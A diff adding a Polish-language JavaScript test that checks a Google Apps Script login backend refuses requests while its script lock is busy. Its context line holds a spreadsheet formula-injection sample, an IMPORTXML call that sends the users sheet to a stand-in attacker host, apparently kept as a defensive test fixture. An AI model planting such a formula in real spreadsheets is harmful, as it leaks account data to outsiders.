@@ -246,4 +246,14 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('odblokowanie zostawia ślad w Log', B.get('Log').w.some(r => r[2] === 'odblokowanie'));
   ok('odblokujKonta nie jest akcją dostępną przez adres /exec', B.post({ akcja: 'odblokujKonta', kod: '12345' }).opis === 'Nieznana akcja');
 }
+/* ---- 12. brak blokady skryptu (kolejka > 20 s) = odmowa, a nie praca bez blokady ---- */
+{
+  const B = swiezy(); B.blokada.zajety = true; const zw = B.blokada.zwolnien;
+  const odp = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' }), B.post({ akcja: 'puls', kod: '12345', dokumenty: 5 }, { haslo: 'haslo123' })];
+  ok('bez blokady skryptu zapytanie dostaje „Serwer zajety” i nic nie zmienia (ani licznika prób, ani statystyk)', odp.every(o => o.status === 'blad' && /zajety/.test(o.opis))
+    && B.get('Uzytkownicy').w[1][8] === '' && B.wywolaj('_licznik("lg:k:12345", 900, false)') === 0, JSON.stringify(odp[0]));
+  ok('…i nie zwalnia cudzej blokady', B.blokada.zwolnien === zw);
+  B.blokada.zajety = false;
+  ok('gdy blokada wolna, wszystko działa jak dotąd', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok' && B.blokada.zwolnien === zw + 1);
+}
 process.exit(kod);
